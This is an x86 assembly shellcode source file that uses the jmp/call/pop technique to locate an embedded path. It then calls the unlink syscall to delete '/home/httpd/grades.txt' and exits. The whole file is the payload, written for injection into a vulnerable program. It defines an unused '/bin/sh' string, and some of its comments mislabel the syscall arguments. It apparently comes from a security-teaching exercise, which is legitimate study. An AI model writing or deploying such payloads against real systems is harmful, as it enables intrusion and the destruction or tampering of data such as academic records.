#include <sys/syscall.h>

#define STRING	"/bin/sh"
#define STRLEN	22
#define ARGV	(STRLEN+1)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
	movb 	$10, %al		/*syscall arg 1: 10, unlink */
	movl	%esi,%ebx		/* syscall arg 2: string pathname */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc		%eax
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	"/home/httpd/grades.txt"
